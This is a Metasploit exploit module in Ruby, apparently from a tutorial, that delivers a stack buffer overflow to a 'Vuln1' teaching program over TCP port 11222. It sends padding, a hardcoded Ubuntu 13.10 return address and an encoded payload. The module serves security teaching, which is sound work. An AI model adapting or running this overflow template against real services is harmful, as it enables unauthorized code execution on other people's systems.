##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Vuln1 test program buffer overflow (Linux)',
      'Description'    => %q{
        Buffer overflow module for educational purpose only
      },
      'Author'         =>
        [
          'Mathieu Blanc'
        ],
      'References'     =>
        [
          [ 'URL', 'http://locus.home.free.fr/root/Metasploit_tuto/metasploit_tuto.pdf' ]
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'process',
        },
      'Privileged'     => false,
      'Payload'        =>
        {
          'Space'    => 400,
          'BadChars' => "",
          'DisableNops'	=>  'True',
        },
      'Platform'       => [ 'linux' ],
      'Targets'        =>
      [
        #
        # Automatic targeting via fingerprinting
        #
        [ 'Automatic Targeting', { 'auto' => true }  ],

        #
        # This special one comes first since we dont want its index changing.
        #
        [	'Debug',
          {
            'Ret' => 0x41414242,
          }
        ],

        #
        # specific targets
        #

        [ "Ubuntu 13.10",
          {
            'Ret' => 0xffffcf30,
          }
        ],

        # [ "Your distrib here",
        #   {
        #     'Ret' => <your esp value here>,
        #   }
        # ]

      ],
      'DefaultTarget'  => 2,
      ))

    register_options(
      [
        Opt::RPORT(11222),
      ], self.class )
  end


  def exploit
    connect

    buf = rand_text_alphanumeric(76)
    buf << [target.ret].pack('V')
    buf << payload.encoded
    sock.put(buf)

    disconnect

  end

end
